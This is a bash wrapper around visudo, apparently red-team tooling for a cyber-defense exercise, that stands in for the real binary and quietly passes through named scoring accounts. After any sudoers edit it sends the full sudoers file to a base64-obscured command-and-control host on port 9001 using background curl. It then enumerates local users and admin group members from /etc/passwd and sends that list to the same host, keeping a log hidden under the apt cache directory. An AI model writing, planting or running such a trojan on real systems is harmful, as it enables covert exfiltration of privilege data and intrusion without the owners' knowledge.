#!/bin/bash
REAL_VISUDO="/usr/sbin/visudo"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_VISUDO "$@" ;;
esac

LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")

BEFORE=""
[ -f /etc/sudoers ] && BEFORE=$(cat /etc/sudoers 2>/dev/null | tr '\n' '|')

$REAL_VISUDO "$@"
RC=$?

if [ $RC -eq 0 ] && [ -f /etc/sudoers ]; then
    AFTER=$(cat /etc/sudoers 2>/dev/null | tr '\n' '|')
    if [ "$BEFORE" != "$AFTER" ]; then
        AFTER_SAFE=$(echo "$AFTER" | sed 's/"/\\"/g')
        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"visudo","timestamp":"%s","data":{"sudoers_content":"%s"}}' \
            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$AFTER_SAFE")
        _log_remote "$PAYLOAD"
        _log_local "${HOST_TS}|visudo|${INVOKING_USER}|sudoers_modified"
    # -- user enumeration sync --
    (
        SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
        SUDO_USERS=$(getent group sudo wheel 2>/dev/null | awk -F: '{print $4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
        USERS_JSON="["
        FIRST=1
        while IFS=: read -r uname _ uid gid _ _ _; do
            [ "$uid" -lt 1000 ] && [ "$uname" != "root" ] && continue
            [ "$uid" -gt 60000 ] && continue
            IS_A=false
            [ "$uname" = "root" ] && IS_A=true
            echo ",$SUDO_USERS," | grep -q ",$uname," && IS_A=true
            [ $FIRST -eq 1 ] && FIRST=0 || USERS_JSON="${USERS_JSON},"
            USERS_JSON="${USERS_JSON}{\"username\":\"${uname}\",\"uid\":${uid},\"is_admin\":${IS_A}}"
        done < /etc/passwd
        USERS_JSON="${USERS_JSON}]"
        SPAYLOAD="{\"host_ip\":\"${HOST_IP}\",\"users\":${USERS_JSON}}"
        curl -sf -X POST -H "Content-Type: application/json" \
            -d "$SPAYLOAD" --connect-timeout 3 --max-time 5 \
            "$SYNC_URL" > /dev/null 2>&1
    ) &
    fi
fi

exit $RC
